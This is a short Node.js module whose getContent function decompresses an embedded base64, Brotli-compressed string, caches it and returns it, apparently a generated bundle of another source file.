let hook

module.exports.getContent = () => {
  if (typeof hook === `undefined`)
    hook = require('zlib')
      .brotliDecompressSync(
        Buffer.from(
          'G+ENIMR/V6vuXE5vHBLGDMKI+S5lv9qpaDt+/0c/DzyUBCOqO/Pm/W3b9S1tO0cF2vE8tU4s63No3e8hQwoFtTF2nQxMHoLFQxZaocLOHN0SBlOX4ksYByj4lE1+Q0pybYqGKfA/Id36gMEcrMJRmwB7q9Yb2yl48+Uih3rwSlGuPoWWaUFGM+LI2oTSZWERc1XKYeNJz6moxlxpUPU4cC+qP4qmYajcKAwh3W+GpXWrR2XUCG528M03Xpfnru6RiU0ZKUWFYS/p6eHxnFSeCZ49TCQ6NFpXWMocpDTRcoA+wqEObOz6BMRcBTCl3qt18otB0aqSKJcRvIDiv/7bodE/GICWkX2HB63CfTuUiORKT9ihjQYqBidZjjCdgkcPn5t4IRgAtFJwxeLYd6QjSabQroUyMjxEaUlEv3/2/gnNuPlty2w84jyXpUBu80gI2UU2x3on3JzXUxfwbDF4I9TM/6T6wdoblRUV+eqwv5MVPB4kwlBsP04qwuAP8MNjqlX2QuTrHx0CkqbIFaOpEJeNrESlzuvIxdhRjeJEJUpVQV/zcEMNIykRKMriGEurVZBSqBRRVAz6cIVcf+Xt1d6cv77Zs+vXrZYe24/zF7vh00d/tmAwexuZfSA1UDs2biThSBZ6BUSUSlwN6KiDwyciOutIzK7M6KnVKrxA3vAq9/ewUpWzQuAQxCmoNurTNSli643CItBe6Eu0YqW/LoZef7H1HC03w6LRv/f4cJyb3siy6qxVKGSnYNm4VUJL2lcnVFFc3VHYKd/QB5XH7vOiUJnVfXRntK8Sh4UVJSgN4SBeUpS06BebfcgQKFyJ7OnaAVIno060PmIoSkr37LWrU3hYsEpD6qAkcU3itVY64pryKu6xl6VVaMUUGSHn45wQzHd64fA0c7sLVce29NNW1UpHHYyrCrM1icjy9vsJWtqqxRC8gic2aFbC964I00YnS/5HHgZh4wdjI68WtTu9u+amr0n83nCAEl8X8qvaz+06y+/o7rbYF+D1Do/v7vxuluLGFyX2v08osC3y60eEmmeMLYZQoZnQExNGMPj9l9uJLY3ISkr3LKzCOj4F5SwVrSquDVHt55FmK0ZegTEGs4M5c8BhqhtXKh84bjNRLriuiN4MebihhqNAiTaVakJq+mt0bBsPWxVfSw/6P3TbSyRyzP0TBcMCCA==',
          'base64'
        )
      )
      .toString()

  return hook
}
